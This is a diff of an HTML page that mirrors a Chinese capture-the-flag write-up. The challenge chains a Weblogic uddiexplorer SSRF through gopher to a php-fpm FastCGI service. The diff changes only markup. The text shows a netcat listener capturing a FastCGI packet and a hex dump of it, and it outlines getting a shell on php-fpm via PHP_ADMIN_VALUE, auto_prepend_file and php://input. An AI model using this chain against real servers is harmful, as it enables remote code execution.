@@ -3,12 +3,12 @@
 			<head>
 			     <title>三个白帽之来自星星的你（一）writeup - LoRexxar</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/16590">http://drops.wooyun.org/tips/16590</a></h1>
 				
       <p>
-        <p>第一次正式做三个白帽的题目，能做出来挺不容易，还踩了很多坑...</p>
+        </p><p>第一次正式做三个白帽的题目，能做出来挺不容易，还踩了很多坑...</p>
 
 <h1>0x00 挑战介绍</h1>
 
@@ -24,7 +24,7 @@
 
 <h1>0x01 wp</h1>
 
-<hr />
+<hr>
 
 <h2>Discuz X3.2</h2>
 
@@ -48,7 +48,7 @@
 
 <p>这里的洞很简单了，稍微搜下发现</p>
 
-<p><a href=" <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2015-0136698">WooYun: 央视网SSRF可窥探内网（Weblogic SSRF案例）</a> "> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2015-0136698">WooYun: 央视网SSRF可窥探内网（Weblogic SSRF案例）</a> </a></p>
+<p><a href=" <a target=" _blank"="">WooYun: 央视网SSRF可窥探内网（Weblogic SSRF案例）</a> "> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2015-0136698">WooYun: 央视网SSRF可窥探内网（Weblogic SSRF案例）</a> </p>
 
 <p>测试发现<strong>http://0761e975dda0c67cb.jie.sangebaimao.com/uddiexplorer/SearchPublicRegistries.jsp</strong>这里的洞确实存在。</p>
 
@@ -103,7 +103,7 @@ nc -lvv 2333 &gt; 1.txt
 <p>我们可以看下1.txt</p>
 
 <pre><code>#!bash
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="55273a3a21152037203b2120">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/home/wwwroot/default/fcgi_exp# xxd 1.txt
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="55273a3a21152037203b2120">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/home/wwwroot/default/fcgi_exp# xxd 1.txt
 0000000: 0101 0001 0008 0000 0001 0000 0000 0000  ................
 0000010: 0104 0001 0112 0600 0f14 5343 5249 5054  ..........SCRIPT
 0000020: 5f46 494c 454e 414d 452f 6f70 742f 6469  _FILENAME/opt/di
@@ -168,7 +168,7 @@ operator=http://ip/gopher.php
 
 <h1>0x02 题目之后？</h1>
 
-<hr />
+<hr>
 
 <p>在做完题目之后想要深究一波原理，结果突然发现题目其实去年的hitcon quals的web400 lalala</p>
 
@@ -178,7 +178,7 @@ operator=http://ip/gopher.php
 
 <p>实际中如果php fastcgi对公网开放，那么就可以拿shell</p>
 
-<p>php-fpm默认监听9000端口，使用 PHP&#95;ADMIN&#95;VALUE 把 allow&#95;url&#95;include 设为 on 以及新增 auto&#95;prepend&#95;file，利用php://input执行php代码写一个shell</p>      </p>
+<p>php-fpm默认监听9000端口，使用 PHP&#95;ADMIN&#95;VALUE 把 allow&#95;url&#95;include 设为 on 以及新增 auto&#95;prepend&#95;file，利用php://input执行php代码写一个shell</p>      <p></p>
     
 			</body>
 		</html>
